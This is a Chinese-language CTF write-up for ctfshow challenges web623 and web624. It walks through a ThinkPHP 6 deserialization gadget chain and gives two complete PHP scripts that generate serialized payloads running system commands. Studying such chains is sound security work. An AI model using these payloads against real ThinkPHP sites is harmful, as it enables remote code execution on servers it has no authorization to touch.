+++
title = "ctfshowthinkphp(续集二)"
slug = "ctfshow-thinkphp-sequel-2"
description = "TP"
date = "2025-03-05T14:00:04"
lastmod = "2025-03-05T14:00:04"
image = ""
license = ""
categories = ["ctfshow"]
tags = ["thinkphp"]
+++

[官方手册](https://www.kancloud.cn/manual/thinkphp6_0/1037479) 本文为了做出ctfshow的thinkphp最后的TP6反序列化，利用网上知识，对反序列化进行复现挖掘

上一集[thinkphp5.1.38反序列化](https://baozongwi.xyz/2025/02/20/ctfshow%E7%9A%84thinkphp%E4%B8%93%E9%A2%98-%E7%BB%AD%E9%9B%86%E4%B8%80/)

## web623

具体版本我也不知道，首先环境弄好

```
composer create-project topthink/think tp6
cd tp6
php think run
```

然后访问发现能够正常启动，就说明环境是对的，再把东西放在小皮里面，创建一个网站，选择`public`为网站根目录即可，thinkphp都是这样，那么开始全局搜索入口点，找了一会发现仅有一个可以利用的`vendor/topthink/think-orm/src/Model.php`中找到了

![1](ctfshowthinkphp(续集二)/QQ20250305-142702.jpg)

```php
public function save(array $data = [], string $sequence = null): bool
    {
        // 数据对象赋值
        $this->setAttrs($data);

        if ($this->isEmpty() || false === $this->trigger('BeforeWrite')) {
            return false;
        }

        $result = $this->exists ? $this->updateData() : $this->insertData($sequence);

        if (false === $result) {
            return false;
        }

        // 写入回调
        $this->trigger('AfterWrite');

        // 重新记录原始数据
        $this->origin   = $this->data;
        $this->get      = [];
        $this->lazySave = false;

        return true;
    }
```

因为没有传入值，`$this->setAttrs($data);`不用看，由于不可能返回False，这里必须要跳出，所以empty也不用看了，看了一下这个函数`trigger`，是进行了

![1](ctfshowthinkphp(续集二)/QQ20250305-153520.jpg)

但是`$this->withEvent`默认为1，所以这里就是进行一个函数的调用，但是我们要的是true，所以`$this->withEvent`要为False，`$result`必须为True，所以跟进一下这两个方法，

![1](ctfshowthinkphp(续集二)/QQ20250306-093402.jpg)

`checkData()`没有返回，跟进`$this->getChangedData()`

![1](ctfshowthinkphp(续集二)/QQ20250306-094333.jpg)

- `$this->force`为`true`时，强制返回所有当前数据，就可以把值给赋值到`$data`了，

继续跟进`$this->checkAllowFields()`，由于`$this->field`确实为空，所以

![1](ctfshowthinkphp(续集二)/QQ20250306-094809.jpg)

![1](ctfshowthinkphp(续集二)/QQ20250306-095859.jpg)

这里使用`.`进行拼接，会触发`__toString()`，我们就可以利用tp5的部分链子了

```
Conversion::__toString()
Conversion::toJson()
Conversion::toArray()
```

没有其他可利用的方法，所以就是这里了

![1](ctfshowthinkphp(续集二)/QQ20250306-101455.jpg)

`$data = array_merge($this->data, $this->relation);`将这个合并为键值对，继续跟进

![1](ctfshowthinkphp(续集二)/QQ20250306-102031.jpg)

![11](ctfshowthinkphp(续集二)/QQ20250306-102250.jpg)

![1](ctfshowthinkphp(续集二)/QQ20250306-102500.jpg)

`$this->convertNameToCamel`这里为空，`$this->strict`默认也是true，所以直接return，所以`$fieldName`与`$data`一致，就直接返回了，那么`getAttr()`里面的`$value`就是我们传入的`$data`。跟进方法发现

```php
$closure = $this->withAttr[$fieldName];
$value   = $closure($value, $this->data);
```

这里就能直接RCE了，参数啥的太混了，自己慢慢写，能写出来

```php
<?php
namespace think\model\concern;
trait Attribute
{
    private $data = ["key"=>"whoami"];
    private $withAttr = ["key"=>"system"];
}
namespace think;
abstract class Model
{
    use model\concern\Attribute;
    private $lazySave = true;
    protected $withEvent = false;
    private $exists = true;
    private $force = true;
    protected $name;
    public function __construct($obj=""){
        $this->name=$obj;
    }
}
namespace think\model;
use think\Model;
class Pivot extends Model
{}
$a=new Pivot();
$b=new Pivot($a);
echo urlencode(serialize($b));
```

## web624

但是我是6.1.4来进行的测试也成功了，最后的方法变成了这个样子

![1](ctfshowthinkphp(续集二)/QQ20250306-105611.jpg)

由于加入了闭包，所以不能直接命令执行了，

![1](ctfshowthinkphp(续集二)/QQ20250306-105938.jpg)

跟进另外一个方法，看到这里很容易进行命令执行，但是前面的方法怎么过呢

`in_array($fieldName, $this->json) && is_array($this->withAttr[$fieldName])`进行一个数组赋值就可以了

```php
<?php

namespace think\model\concern;

trait Attribute
{
    private $data = ["key" => ["key1" => "whoami"]];
    private $withAttr = ["key"=>["key1"=>"system"]];
    protected $json = ["key"];
}
namespace think;

abstract class Model
{
    use model\concern\Attribute;
    private $lazySave;
    protected $withEvent;
    private $exists;
    private $force;
    protected $table;
    protected $jsonAssoc;
    function __construct($obj = '')
    {
        $this->lazySave = true;
        $this->withEvent = false;
        $this->exists = true;
        $this->force = true;
        $this->table = $obj;
        $this->jsonAssoc = true;
    }
}

namespace think\model;

use think\Model;

class Pivot extends Model
{
}
$a = new Pivot();
$b = new Pivot($a);

echo urlencode(serialize($b));
```

可以看到就变了这个部分，然后就通杀了，但是这怎么这么难啊，根本想不到
